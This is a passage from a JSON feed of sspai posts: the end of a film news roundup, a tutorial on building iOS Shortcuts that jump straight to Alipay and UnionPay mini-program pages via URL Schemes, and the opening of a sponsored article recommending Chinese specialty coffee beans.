href=\"https://www.bilibili.com/video/BV1WQ4y1Y7Z2?from=search&amp;seid=1229460891723343631\" target=\"_blank\"><strong>佩德罗·阿莫多瓦导演新片《平行母亲》：</strong></a>佩德罗·阿莫多瓦导演、佩内罗普·克鲁兹主演的新片《平行母亲》发布正式预告，12 月 24 日北美上映。该片将担任威尼斯电影节开幕片、纽约电影节闭幕片。</p>\n<p><a href=\"https://www.bilibili.com/video/BV17P4y1p7dB?from=search&amp;seid=15633822540152830164\" target=\"_blank\"><strong>纪录片《舒马赫》9 月 15 日上线 Netflix：</strong></a>Neflix 发布纪录片《舒马赫》预告，将于 9 月 15 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1vP4y1p7Tp\" target=\"_blank\"><strong>漫改 TV 动画《SLOW LOOP -女孩的钓鱼慢活-》：</strong></a>改编自内野舞子的同名漫画，秋田谷典昭执导，CONNECT 制作，2022 年 1 月开始播出，少女日和钓鱼时阻止了想跳入海中的小春，对方竟是母亲再婚对象的女儿。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1TA411c7C2\" target=\"_blank\"><strong>轻改 TV 动画《自称贤者弟子的贤者》：</strong></a>改编自りゅうせんひろつぐ的同名轻小说，元永庆太郎执导，studio A-CAT 制作，2022 年 1 月开始播出，意外穿越至游戏世界的咲森鉴，以自己弟子的名义展开冒险。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>《黑客帝国 4》正式定名《黑客帝国 4：矩阵重生》</h3>\n<p>8 月 25 日，华纳影业在 Cinemacon 产业大会正式揭晓《黑客帝国 4》片名——《黑客帝国 4：矩阵重生》（The Matrix: Resurrections），并在现场公布了预告，不过该视频仅供现场观众，并没有放到线上。在预告中，尼奥似乎再度困于一个平凡的世界，形象逐渐变为老人，得到红色药丸。</p>\n<p>该片由《黑客帝国》系列导演拉娜·沃卓斯基继续执导，基努·里维斯、凯瑞-安·莫斯、尼尔·帕特里克·哈里斯、叶海亚·阿卜杜勒-迈丁、杰西卡·亨维克、佩丽冉卡·曹帕拉、乔纳森·格罗夫、贾达·萍克·史密斯、丹尼尔·伯哈特等全明星主演，将于 12 月 22 日北美上映，同时登陆 HBO Max。</p>\n<h3>莱昂纳多·迪卡普里奥、詹妮弗·劳伦斯主演新片《不要抬头》定档</h3>\n<p>8 月 24 日，莱昂纳多·迪卡普里奥、詹妮弗·劳伦斯主演的新片《不要抬头》正式宣布定档：12 月 10 日北美部分影院上映，12 月 24 日上线 Netflix。该片由亚当·麦凯自编自导，卡司包括罗布·摩根、凯特·布兰切特、梅丽尔·斯特里普、乔纳·希尔、希米什·帕特尔、提莫西·查拉梅、爱莉安娜·格兰德、克里斯·埃文斯、马修·派瑞等。</p>\n<h3>迪士尼将翻拍《海底两万里》真人剧集</h3>\n<p>8 月 23 日，迪士尼宣布将翻拍儒勒·凡尔纳的经典科幻小说《海底两万里》，詹姆斯·多默编剧、制片，第一季共 10 集，上线时间待定。《海底两万里》此前已得到多次影视改编，迪士尼 1954 年拍摄的同名电影获得两项奥斯卡奖，本作标题定为《鹦鹉螺号》，将聚焦尼莫船长的起源故事。 <a href=\"https://www.hollywoodreporter.com/tv/tv-news/disney-nautilus-20000-leagues-under-sea-adaptation-1235001471/\" target=\"_blank\">来源</a></p>\n<h3>韩寒第四部电影《四海》</h3>\n<p>韩寒导演的第四部电影《四海》正式杀青，本片将由刘昊然、刘浩存、沈腾、尹正等主演，定档大年初一。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/article/6aac8300b2328ce46e42cb145e95f5fd\"></figure><h3>更多</h3>\n<p><strong>HBO 热剧《继承之战》第 3 季宣布今年 10 月开播：</strong>《继承之战》第三季爆出新款剧照，亚历山大·斯卡斯加德、艾德里安·布洛迪宣布参演。该剧将于今年 10 月登陆 HBO。</p>\n<p><strong>《活死人军团》前传影片《神偷军团》将于 10 月 29 日登陆 Netflix：</strong>《活死人军团》前传电影《神偷军团》将于 10 月 29 日登陆 Netflix。该片由扎克·施奈德担任制片人，马提亚斯·施维赫夫自导自演。影片讲述主角路德维希在神秘女子的劝说下，打开了世上最为严密的保险库。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/article/d95eee37be0a3e36c73b5edc78ee21ea\"></figure><p><strong>《法官大人》宣布续订第二季，明年开拍并播出：</strong>改编自以色列热剧《Kvodo》，由布莱恩·科兰斯顿主演的高口碑剧集《法官大人》宣布续订第 2 季，共 10 集。剧集讲述科兰斯顿饰演的一名受人尊敬的法官因为儿子卷入的一起肇事逃逸事件，而引发的一系列故事。</p>\n<p><strong>邱礼涛执导的《扫毒3：天大地大》在香港开机拍摄：</strong>由邱礼涛执导的电影《扫毒3：天大地大》在香港开机拍摄，本片由古天乐、郭富城、刘青云、杨采钰领衔主演，罗嘉良特别出演，影片讲述金三角地区缉毒警察与毒枭团伙的生死对决故事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/180c6a3c192ed0a8e26e414e31cf3883\"></figure><p> </p>\n<p><strong>电影《唐顿庄园：新纪元》发布宣传海报，明年 3 月 18 日北美上映：</strong>该片为 2019 年电影版《唐顿庄园》续集，由西蒙·柯蒂斯执导，朱利安·费罗斯继续担任编剧，玛吉·史密斯、米歇尔·道克瑞、休·博内威利、艾美达·斯丹顿等演员回归主演。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/article/a0849d056776d3ee364c366bd9748be3\"></figure><p><strong>Women Make Movies 举办「阿富汗女性之声」线上影展：</strong>在阿富汗局势动荡之际，关注女性影人的独立电影发行机构 Women Make Movies 正在他们的网站上放映九部有关阿富汗的纪录片，内容聚焦于这一地区的历史以及阿富汗女性的声音及生活经验。此次线上影展将持续至8月31日，观影请于 <a href=\"https://www.wmm.com/voices-of-afghan-women-virtual-screening/\" target=\"_blank\">官网注册</a>。</p>\n<p><strong>漫改日剧《神之雫》：</strong>改编自亚树直原作、冲本秀绘画的同名漫画，山下智久主演，2022 年上线 Hulu。葡萄酒评论家神咲丰多香因病去世，要求儿子神咲雫与养子远峰一青比赛争夺遗产，已有 2009 年版剧集。 <a href=\"https://natalie.mu/music/news/442103\" target=\"_blank\">来源</a></p>\n<p><strong>漫改 TV 动画《机动奥特曼 第二季》：</strong>改编自清水荣一原作、下口智裕绘画的同名漫画，系 1966 年初代奥特曼续篇，神山健治、荒牧伸志执导，Production I.G、Sola Digital Arts 制作，2022 年春上线 Netflix。 <a href=\"https://twitter.com/heros_ultraman/status/1430130869109334027\" target=\"_blank\">来源</a></p>\n<p><strong>游戏改 TV 动画《Fit Boxing 健身拳击》：</strong>改编自同名 Switch 游戏系列，森田纯平执导、编剧，白户佑辅音乐，Imagineer、Story Effect 制作，讲述教练们在游戏外所发生的日常故事，2021 年 10 月开始播出。 <a href=\"https://twitter.com/FitBoxingInfo/status/1430802192638746625\" target=\"_blank\">来源</a></p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/cdf579f57233525ce355e12a9de2aa3b.jpg\"></figure><p>本期的彩蛋是由读者 <a class=\"ss-atUser\" data-mention=\"@梅花之雨\" user-id=\"bs2pe6lb34tcs0po8d80\" href=\"https://sspai.com/u/ta4hh9gx\">@梅花之雨</a> 提供的「看图猜电影」，由作者 <a class=\"ss-atUser\" data-mention=\"@leadream\" user-id=\"bs2p7htb34tcs0pm78tg\" href=\"https://sspai.com/u/leadream\">@leadream</a> 作画。首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68498"},{"title":"支付宝、云闪付小程序一键直达：URL Scheme 跳转扩展用法","date":"2021-08-27 08:58:21","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>编注：此文章为<a href=\"https://sspai.com/post/68466\" target=\"_blank\">《微信小程序也能一键直达，除了健康码你还想跳转什么？》</a>的后续拓展，如果你还没有看过这篇文章，推荐先行阅读；如果你对微信不感兴趣，又有制作快捷指令的基础，欢迎跳过直接阅读本文。</p>\n<p>上篇文章介绍了微信小程序指定页面的 URL Scheme 抓取，以及相关自动化的制作。但是由于该方法使用人数的增加，很快就触及了微信小程序的每日 50<strong> </strong>万次的跳转上限，导致了很多人在中午开始就无法使用 URL Scheme 跳转，另一方面，也有不少读者反馈日常更惯用支付宝/云闪付，希望能够给出类似的活用方式。</p>\n<p>所以经过作者群友 <a href=\"https://sspai.com/u/sunsetye/updates\" target=\"_blank\">@SunsetYe</a> 的提示，又实现了支付宝的指定页面路径跳转，而且方法比微信小程序简单很多，接下来就来看看如何只用简单几个步骤，实现支付宝指定页面的路径抓取。另外，云闪付的小程序用了类似的方法进行跳转，在此处也一并讲解，提供给有需要的读者参考使用。</p>\n<h2>支付宝</h2>\n<p>首先，打开支付宝，来到需要抓取的小程序页面。此处以上海的随申码为例演示，打开随申办小程序，点击顶部的「随申码」按钮进入页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1nlb34tcvciqa3a0.png\"></figure><p>可以看出这个一个二级页面，如果想要使用 URL Scheme 一键访问，同样需要知道这个页面的 path 参数（可理解为某个页面的「身份证」。点击右上角的「更多」图标按钮，再依次点击「分享」&gt;「复制链接」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1odb34tcu4buqpgg.png\"></figure><p>剪切板的链接地址如下所示，前往 Safari 粘贴打开剪切板链接，这时候会弹出询问窗口，询问是否在支付宝中打开。</p>\n<pre class=\"language-css\"><code>https://ur.alipay.com/7jQeHZlc</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1olb34tcvt9nu0b0.png\"></figure><p>点击取消，看到 Safari 的地址栏，可以看出短链接经过解析，变成了含有参数的长链接。复制出这个长链接，如下所示：</p>\n<pre class=\"language-apache\"><code>https://render.alipay.com/p/s/i/?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FappId%3D2019072665939857%26page%3Dpages%252Fmy-station-type%252Fmy-station-type%26enbsv%3D0.2.2108270116.35%26chInfo%3Dch_share__chsub_CopyLink</code></pre>\n<p>此处的链接参数是被编码过的，使用 URLDecode.org 进行解码一下，得到如下的原始文本，我们将这一长串的链接分段解析一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1p5b34tcu4buqph0.png\"></figure><pre class=\"language-perl\"><code>https://render.alipay.com/p/s/i/?\nscheme=alipays://platformapi/startapp?appId=2019072665939857\n&amp;page=pages%2Fmy-station-type%2Fmy-station-type\n&amp;enbsv=0.2.2108270116.35\n&amp;chInfo=ch_share__chsub_CopyLink</code></pre>\n<p>可以看到，解析后的链接中包含了四个参数。分别是 scheme、page、enbsv、chInfo，根据<a href=\"https://sspai.com/post/68466\" target=\"_blank\">《微信小程序也能一键直达，除了健康码你还想跳转什么？》</a>中微信小程序的格式，不难猜出 scheme 和 page 拼接之后就能打开指定路径，此处的 page 就等价于微信的 path。所以删除前后无用的参数，只保留 scheme 和 page，就可以构造出如下的链接地址：</p>\n<pre class=\"language-plain text\"><code>alipays://platformapi/startapp?appId=2019072665939857&amp;page=pages%2Fmy-station-type%2Fmy-station-type</code></pre>\n<p>有了 URL Scheme 之后，就可以打开快捷指令进行构建了（下简称为「捷径」）。新建捷径，选择「打开 URL」模块，将构造好的 URL Scheme 地址填入，编辑好捷径的名称和图标之后就制作好了。</p>\n<p>此处有一个小技巧需要介绍，捷径在只有一个动作的情况下，无法显示自定义的捷径图标。这个时候可以在捷径里随意加一个无意义的变量解决这个问题，例如加入一个「文本」动作。或者也可以将 URL Scheme 放在「URL」模块里，然后使用「打开 URL」打开它，两种解决方法都是可以的。</p>\n<p>为了方便读者使用，点击即可下载 <a href=\"https://www.icloud.com/shortcuts/2d84949da29149308a0e16ab1ad9232e\" target=\"_blank\">支付宝随申码</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1pdb34tcvt9nu0bg.jpeg\"></figure><h4>注意要点</h4>\n<ol>\n<li>该方法可以作为通用 <a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a> 中「网页书签法」的扩展方法，在之前的文章中只讲到了支付宝打开小程序，因为当时的局限性不知道有 page 参数可用，所以此处补齐这个扩展方法。</li>\n<li>对于需要登录授权的小程序，例如通信行程卡，可能需要短信验证码才可以登录。</li>\n<li>和微信小程序一样，如果拍照使用的是官方的接口，一样无法获取到页面路径。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/8d68291dd2366b94f33ce265f1184ec1.gif\"></figure><h2>云闪付</h2>\n<p>在<a href=\"https://sspai.com/post/68466\" target=\"_blank\">《微信小程序也能一键直达，除了健康码你还想跳转什么？》</a>文章发出后，作者群友 <a href=\"https://sspai.com/u/a54ag05p/posts\" target=\"_blank\">@sleep9ull</a> 询问我，是否能够抓取出云闪付的小程序地址，据他介绍云闪付打开随申码无需次次授权，只需要一次授权，<strong>长期有效</strong>。稍微研究了一下，也找出了云闪付的 URL Scheme 跳转地址结构，格式如下：</p>\n<pre class=\"language-apache\"><code>upwallet://applet?toLink=【小程序 URL】&amp;encryptAppId=【小程序 ID】</code></pre>\n<p>接下来趁热打铁，看看如何实现云闪付的小程序地址抓取。打开随申码小程序页面，同样是复制链接，依次点击右上角的「更多」图标 &gt;「分享」&gt;「复制链接」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1qdb34tcu4buqphg.png\"></figure><p>但是此时，如果还想使用和支付宝一样的方法，是行不通的了。因为此时已经是一个长链接了，复制到 Safari 打开也没用了。这次直接对链接进行分析，由于这个链接中包含了个人身份信息，我对链接做了一些处理，替换了某些参数值来介绍。所以替换后的链接地址如下所示：</p>\n<pre class=\"language-apache\"><code>https://base.95516.com/s/wl/WebAPP/helpAgree/page/help/shareRutineHelp.html?params=ewogICJ0b0xpbmsiIDogImh0dHBzOi8vc3Vpc2hlbm1hZnJvbnQxLnNoLmdvdi5jbi9zbXp5L2Z5ei9xcmNvZGU/ZnJvbT15c2YmYWRkcmVzcz0mbG9uZ2l0dWRlPTEyMC4wMCZsYXRpdHVkZT0zLjAwJnR5cGU9RllfUVJDT0RFXzAxJm13PXNzcGFpSmFtZXNIb3Bib3VybiZpc1JlbGF0aW9ucz0wJm13Rm9yUmVsYXRpb25zPXZuS0FreDc3JTIwbTNGNjdPcjdTU0RPc1N3RnFncjBFUWYvb0VWMTJFclVWZWRWRGQvc3NwYWkiLAogICJlbmNyeXB0QXBwSWQiIDogImJhNDMxYmY3MDUwNzMxYTAiCn0=</code></pre>\n<p>可以看出，它不同于曾经见到过了支付宝或者微信小程序链接，后面跟着一堆 ABCD 字母，看到最后的等于号，不难猜出这是一段 base64 编码。将这段 base64 复制，在终端使用 base64 命令进行解码。如果不习惯使用终端，也可以使用在线的 base64decode.org 进行解码，解码后的内容如下所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1qlb34tcuopj7kvg.png\"></figure><pre class=\"language-json\"><code>{\n  \"toLink\" : \"https://suishenmafront1.sh.gov.cn/smzy/fyz/qrcode?from=ysf&amp;address=&amp;longitude=120.00&amp;latitude=3.00&amp;type=FY_QRCODE_01&amp;mw=sspaiJamesHopbourn&amp;isRelations=0&amp;mwForRelations=vnKAkx77%20m3F67Or7SSDOsSwFqgr0EQf/oEV12ErUVedVDd/sspai\",\n  \"encryptAppId\" : \"ba431bf7050731a0\"\n}</code></pre>\n<p>此处有两个参数，toLink 和 encryptAppId，而 encryptAppId 就是所谓的小程序 ID，没有值得研究的地方。接着将此处的 toLink 参数单独拿出解析一下，将它切分一下，看看各个参数值。可以看出此处有 8 个参数，包含了跳转来源、地址、经纬度和 mw 等参数。</p>\n<pre class=\"language-perl\"><code>https://suishenmafront1.sh.gov.cn/smzy/fyz/qrcode?\nfrom=ysf\n&amp;address=\n&amp;longitude=120.00\n&amp;latitude=3.00\n&amp;type=FY_QRCODE_01\n&amp;mw=sspaiJamesHopbourn\n&amp;isRelations=0\n&amp;mwForRelations=vnKAkx77%20m3F67Or7SSDOsSwFqgr0EQf%2FoEV12ErUVedVDd%2Fsspai</code></pre>\n<p>经过实验，此处只需要保留一个 mw 即可成功认证。请注意此处的 mw 等效于个人身份标识码，所以请不要将这个链接随意分享。最后删除无用参数，重构链接得到以下结果：</p>\n<pre class=\"language-plain text\"><code>https://suishenmafront1.sh.gov.cn/smzy/fyz/qrcode?mw=sspaiJamesHopbourn</code></pre>\n<p>刚才在开头提过了云闪付小程序的基本结构，接下来就是构建 URL Scheme 了，拼接两个参数之后，得到如下的 URL Scheme</p>\n<pre class=\"language-plain text\"><code>upwallet://applet?toLink=https://suishenmafront1.sh.gov.cn/smzy/fyz/qrcode?mw=sspaiJamesHopbourn&amp;encryptAppId=ba431bf7050731a0</code></pre>\n<p>同样将它创建为一个捷径。新建捷径，选择「打开 URL」模块，粘贴这个 URL Scheme 地址即可。</p>\n<p>云闪付对参数进行了 base64 编码，但是经过解码之后一样可以得到关键信息。其实看过云闪付的桌面书签代码之后，感觉它做的还是比较好的。内部使用了 base64 和字符串拼接之后才能得到 URL Scheme，增大了直接获取 URL Scheme 的难度。</p>\n<p>但是其实也是有通杀方法的，不去分析网页代码，无论如何最终书签都是要跳转应用的。所以另一种方法是使用 <a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a> 中「网页报错法」，在电脑上伪装 UA，直接打开链接，一下就能获得到完整的 URL Scheme。云闪付小程序的 URL Scheme 基本格式正是使用这个方法获得。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1qtb34tcvciqa3ag.png\"></figure><h2>小结</h2>\n<p>现在，三个常用应用：支付宝、微信、云闪付的小程序 URL Scheme 结构都介绍过了，至于要如何使用，就看各位读者自行发挥的能力了，花几分钟动手折腾一下还挺有趣的，亦可为日后使用带来不少便捷。下面是三个软件的跳转情况对比图，读者可以选择合适的软件进行跳转。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ka1r5b34tcu4buqpi0.png\"></figure><p>最后，再来总结一下这三个软件小程序跳转的基本格式</p>\n<pre class=\"language-apache\"><code>weixin://app/wx5aa333606550dfd5/jumpWxa/?userName=【账号原始 ID】&amp;path=【页面路径】</code></pre>\n<p> </p>\n<pre class=\"language-plain text\"><code>alipays://platformapi/startapp?appId=【小程序 ID】&amp;page=【页面路径】</code></pre>\n<p> </p>\n<pre class=\"language-plain text\"><code>upwallet://applet?encryptAppId=【小程序 ID】&amp;toLink=【小程序 URL】</code></pre>\n<h2>彩蛋</h2>\n<p>在部分学校里的菜鸟驿站站点，收取快递可能需要出示身份码扫描。在研究菜鸟小程序的身份码的时候，使用上面的「支付宝分享法」解析出了淘宝直达链接，有需要的读者也可以自取，使用 URL Scheme 一件跳转之后，就不需要额外再下载「菜鸟驿站」了，只需要捷径点击一下，即可直接打开身份码，URL Scheme 地址和演示效果如下。</p>\n<pre class=\"language-apache\"><code>tbopen://m.taobao.com/tbopen/index.html?h5Url=https%3A%2F%2Fmarket.m.taobao.com%2Fapp%2Fcn-yz%2Fmulti-activity%2FauthCode.html</code></pre>\n<p> </p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/885b6d623489aa7d3eb8e78297277a63.gif\"></figure><h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66334\" target=\"_blank\">URL Scheme 查询指南</a></li>\n<li><a href=\"https://sspai.com/post/68466\" target=\"_blank\">微信小程序也能一键直达，除了健康码你还想跳转什么？</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68497"},{"title":"国物馆｜不止千年茶文化，我们还有这些国产好咖啡","date":"2021-08-27 08:21:30","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>十几年前，国内的咖啡馆随处可见名为「蓝山咖啡」、「猫屎咖啡」等的当家花旦。十几年后的今天，精品咖啡界却有了翻天动地的变化。蓝山依旧是一个很金贵的咖啡产区，但当家花旦却落到了巴拿马瑰夏、埃塞俄比亚花魁等更具特色的品种上。</p>\n<p>近年来，随着国内精品咖啡市场的发展，云南咖啡也从逐渐精品化，许多注重品质的咖啡豆种及品牌开始涌现，在国际舞台上崭露头角。本文将介绍一些作者作为口粮的高性价比咖啡豆与器具，权作抛砖引玉，欢迎各位在评论中积极安利。</p>\n<h2>辛鹿 / 黑钻咖啡：极具性价比的精品口粮豆</h2>\n<p>辛鹿、黑钻品牌共同隶属于云南保山中咖，前者主打高性价比豆，后者主打全球产区甄选，在价格与质量之间达到了良好的平衡，辛鹿的挂耳包也是我精品咖啡入坑的第一个品牌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejslb34t99b7ntf5g.jpeg\"></figure><p>辛鹿、黑钻的产品线大致分两类：挂耳 / 冷萃包、现烘咖啡豆 / 氮冷保鲜包。</p>\n<h3>入坑款：平价精品挂耳</h3>\n<p>辛鹿、黑钻品牌的挂耳一共有五种，产品体系大体一致，日常价格在 1.8 - 3.8 / 10g 之间，此处就以辛鹿店铺的体系介绍。</p>\n<h4>1、2 号经典拼配挂耳</h4>\n<ul>\n<li>1 号意夏：黑巧、坚果、面包、焦糖</li>\n<li>2 号蓝冬：蓝莓、可可、葡萄柚、烤杏仁</li>\n</ul>\n<p>1、2 号经典拼配挂耳可能最接近你记忆中的咖啡模样，分别对应店内售卖的「意夏」与「蓝冬」拼配咖啡豆。</p>\n<p>实际的试喝中，意夏在前段有一丝丝烟感与苦味，中段和尾端则是很经典的黑咖风味、带有一丝回甘；蓝冬则只有中度烘焙，有一丝丝正向的酸味与类似可可的苦味，蓝莓、葡萄柚的风味则不太明显，更像是隐藏在甜感当中的小「彩蛋」，整体平衡感好。对于追求效率、性价比的学生党来说，平均 1.8 / 杯的日常价格十分友好。</p>\n<h4>3 号创新拼配挂耳</h4>\n<ul>\n<li>3 号樱桃蜜柚中浅烘：红酒、樱桃、蜜柚、焦糖</li>\n<li>3 号樱桃蜜柚中深烘：红酒、巧克力、坚果、焦糖、莓果</li>\n</ul>\n<p>3 号樱桃蜜柚挂耳则是辛鹿家的「镇店之宝」，分中浅度烘培和中重度烘培两个烘培度。其中，中重度款只在黑钻旗舰店出售。</p>\n<p>3 号拼配是一支云南拼配，经过恰当冲煮则会有优秀的甜感。中浅度烘培有浓重的发酵风味，类似于酸甜樱桃果汁与红酒的风味、触感和酸甜感，中重度烘培则削弱了酸与发酵感，焦糖与巧克力的风味占上风的同时，清新的风味仍旧存在，更加平衡，适合喜欢低酸的朋友尝试。</p>\n<h4>4、5 号单品精选挂耳</h4>\n<ul>\n<li>4 号耶加雪菲：甜橙、桃子、茉莉花、绿茶</li>\n<li>5 号罕贝拉花魁：草莓、菠萝、荔枝、木瓜</li>\n</ul>\n<p>4、5 号则是两个来自埃塞俄比亚的咖啡豆，有独特且突出的产区风味，也是较为「亲民」的精品咖啡。</p>\n<p>4 号英雄产自埃塞俄比亚古吉与耶加雪菲的交界处，曾获 2019 年 TOH 生豆竞赛水洗组冠军。它的口感类似于绿茶，在尾韵中有一股不易捕捉到的茉莉花香，也有类似甜橙、桃子的酸质与回甘。</p>\n<p>5 号花魁产自埃塞俄比亚罕贝拉产区，曾获 2017 年 TOH 生豆竞赛日晒组冠军。它的名字中虽然有「花」，实际占主导的其实是水果风味。日晒处理法给它带来了更浓重的风味表现，以莓果、热带水果为主导。</p>\n<p>4 号、5 号挂耳均属于浅度烘焙的精品咖啡入门经典款式，酸度较高，你也许初尝时不甚习惯，但不失为一个探索的好选择。</p>\n<h3>进阶款：精品口粮豆、氮冷保鲜装</h3>\n<p>除了挂耳之外，黑钻与辛鹿的精品咖啡豆也也可圈可点。</p>\n<p>经典的埃塞俄比亚花魁、英雄，云南水洗铁皮卡、红酒日晒，印尼曼特宁等精品口粮豆均以 40~60 元 / 半磅的价格出售。更加精品的豆子，如红标瑰夏、埃塞花序/花妖、哥伦比亚橘子硬糖等，则以 100g + 充氮气的小包装出售，充分满足尝鲜的需求。</p>\n<p>当然，辛鹿与黑钻都有云南近年来探索出的新经典精品。草莓优格有着浓厚的草莓糖、草莓养乐多风味，酒酿圆子则像是一碗桂花酒酿，云南瑰夏又像是樱桃蜜柚的基底上叠加了一层瑰夏风味，十分奇妙。</p>\n<figure class=\"ss-imgRows\" figcaption=\"上述两系列日常售价\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejt5b34t9arh0b370.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejtdb34t99b7ntf60.jpeg\" alt=\"\"></figure><p>而充氮系列还有一个 22g 包装，主要是提供随身包及一些新品种的试喝体验，小包也更适合冷冻存储，一次喝一包，更方便。</p>\n<p>上述的氮冷保鲜包装是将现烘咖啡豆包装后充入氮气，可以直接放入冰箱冷冻室内保存，使赏味期从 30 天延长到 120 天，乃至更长。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：22g 日常售价，右：基础系列 | 图源：Sinloy 旗舰店\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejtlb34t9abj2c7n0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejttb34t9a5fkks8g.png\" alt=\"\"></figure><p>要注意的是，辛鹿与黑钻店铺共同采用工厂 - 顾客的直送模式，由于地处云南保山边境，使用顺丰陆运到华东、华南地区也要 4-5 天时间。</p>\n<h2>明谦咖啡</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejutb34t9arh0b37g.jpeg\"></figure><p>明谦咖啡自 09 年开始就在精品咖啡市场上活动，与庄园冠名合作、售卖咖啡熟豆、开展产地优选计划、咖啡专业培训等。明谦的豆子我个人接触的比较晚，因此挑选几个令我印象很深刻的来介绍。</p>\n<h3>意式拼配</h3>\n<p>相比辛鹿、黑钻单品豆占多数的产品线，明谦的产品线更为全面，其中差别最大的就是他们的拼配类产品。拼配豆通常是为了满足制作意式浓缩的需求定制的。由于意式浓缩会放大咖啡豆本身的风味与瑕疵，目前主流方案是使用拼配豆来兼顾各方面的需求，当然也可以使用级别更高的单一产地豆来制作 SOE。</p>\n<p>例如，明谦的经典意式拼配教父采用哥伦比亚、云南、精品罗布斯塔拼配，在兼顾口感的同时油脂丰富，对拉花十分友好。</p>\n<p>而对于我来说，更偏好于风味黑咖，明谦就有多款各具特点的风味拼配可以选择。例如，一剪梅拼配使用埃塞俄比亚日晒 + 水洗，在风味上让我有眼前一亮的感觉：突出而又具象的莓果风味，在做成冰美式的时候尤为清爽；而做成 Dirty 时，浓郁的草莓牛奶味涌入舌尖，冰凉的液体又带来了额外的凉爽，在夏天闷上一杯尤其舒适。</p>\n<p>类似的产品还有很多，例如含有 20% 巴拿马瑰夏的太空人拼配、同为埃塞日晒 + 水洗却花香扑鼻的香蜜拼配等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejvdb34t9a5fkks90.png\"><figcaption>图片来源：明谦旗舰店</figcaption></figure><p>当然，业内还有很多值得选购的风味拼配品牌，如 Manner、啟程拓殖、捌比特等，不再赘述。</p>\n<h3>泰摩 &amp; 明谦合作：冰瞳滤杯</h3>\n<p>很多人上手手冲咖啡的第一个滤杯会是 